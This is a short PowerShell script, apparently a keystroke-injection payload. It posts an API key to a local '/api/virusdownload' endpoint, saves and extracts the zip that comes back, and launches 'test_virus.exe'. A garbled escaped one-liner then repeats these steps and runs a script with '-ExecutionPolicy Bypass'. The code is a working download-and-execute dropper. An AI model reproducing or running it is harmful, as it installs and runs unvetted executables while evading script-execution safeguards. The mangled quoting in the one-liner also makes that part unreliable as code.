# PowerShell Script Content
$apiKey = "superSecretApiKey"
$url = "http://127.0.0.1:5000/api/virusdownload"
# PowerShell Script Content
$testPath = "C:\TestVirusPath"
$zipPath = "$testPath\downloaded.zip"
$extractPath = "$testPath\extracted"
$exePath = "$extractPath\test_virus.exe"

# Create the test path folder if it doesnt exist
if (-Not (Test-Path -Path $testPath)) {
    New-Item -ItemType Directory -Path $testPath -Force
}

# Download 
Invoke-WebRequest -Uri $url -Method POST -Headers @{"Content-Type"="application/json"} -Body (@{api_key=$apiKey} | ConvertTo-Json) -OutFile $zipPath

# # Extract 
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# # Execute
Start-Process -FilePath $exePath -Wait


$url = \\"http://127.0.0.1:5000/api/virusdownload\\"; $zipPath = \\"$testPath\\downloaded.zip\\"; $extractPath = \\"$testPath\\extracted\\"; $exePath = \\"$extractPath\\test_virus.exe\\"; if (-Not (Test-Path -Path $testPath)) { New-Item -ItemType Directory -Path $testPath -Force }; Invoke-WebRequest -Uri $url -Method POST -Headers @{\\"Content-Type\\"=\\"application/json\\"} -Body (@{api_key=$apiKey} | ConvertTo-Json) -OutFile $zipPath; Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force; Start-Process -FilePath $exePath -Wait'); powershell -ExecutionPolicy Bypass -File C:\\TestVirusPath\\script.ps1"
ENTER